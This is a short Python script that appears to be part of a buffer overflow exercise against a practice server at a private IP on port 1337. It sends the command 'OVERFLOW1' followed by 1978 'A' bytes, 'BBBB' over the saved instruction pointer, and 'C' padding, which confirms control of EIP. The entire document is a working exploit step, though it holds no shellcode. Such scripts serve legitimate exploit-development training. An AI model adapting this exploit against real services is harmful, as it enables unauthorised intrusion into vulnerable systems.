#!/usr/bin/env python3

import socket

host, port = "10.10.209.4", 1337

command = b"OVERFLOW1 "
length = 5000
offset = 1978
new_eip = b"BBBB"

payload = b"".join([
	command,
	b"A" * offset,
	new_eip,
	b"C" * ( length - len(new_eip) - offset),
])

with socket.socket() as s:
	s.connect((host, port))
	# banner = s.recv(4096).decode("utf-8").strip()
	s.send(payload)